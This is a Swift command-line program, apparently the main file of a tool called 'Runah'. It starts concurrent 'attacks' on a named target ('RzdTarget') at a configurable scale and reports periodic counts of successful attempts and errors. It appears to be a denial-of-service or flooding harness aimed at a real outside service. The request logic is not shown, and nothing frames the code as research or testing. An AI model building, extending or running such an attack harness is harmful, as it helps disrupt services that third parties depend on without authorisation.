import Foundation
import ArgumentParser
#if canImport(FoundationNetworking)
import FoundationNetworking
#endif

final class Runah: ParsableCommand {
  private enum CodingKeys: CodingKey {
    case scale
    case statsInterval
  }

  @Argument(help: "How many concurrent jobs will be running simultaneously, default value is 1")
  var scale: Int = 1

  @Argument(help: "Print statistics interval (in seconds), default value is 60")
  var statsInterval: Int = 60

  private var attackingTargets = [Target]()
  private var operationQueue = OperationQueue()
  private var timer: Timer?

  func run() throws {
    assert(scale > 0, "Scale must be greater than 0")
    attackingTargets = [
      RzdTarget(operationQueue: operationQueue, scale: scale, urlSession: .shared)
    ]
    startAttacks()
    startPrintStatsTimer()
    printStats()
  }

  private func startAttacks() {
    for target in attackingTargets {
      target.attack()
    }
  }

  private func startPrintStatsTimer() {
    DispatchQueue.global().async {
      let timer = Timer(timeInterval: TimeInterval(self.statsInterval), repeats: true) { [weak self] _ in
        self?.printStats()
      }
      RunLoop.current.add(timer, forMode: .common)
      RunLoop.current.run()
      self.timer = timer
    }
  }

  private func printStats() {
    let header = String(repeating: "–", count: 51)
    print("\n\n")
    print(header)
    print("runah stats for \(Date())")
    print(header)
    for target in attackingTargets {
      print(formattedStats(for: target))
    }
    print(header)
  }

  func formattedStats(for target: Target) -> String {
    String(
      format: "%@%@| ✓ %10d | ⨯ %10d |",
      target.name,
      String(repeating: " ", count: 20 - target.name.count),
      target.stats.successAttempts,
      target.stats.errors
    )
  }
}

Runah.main()
dispatchMain()
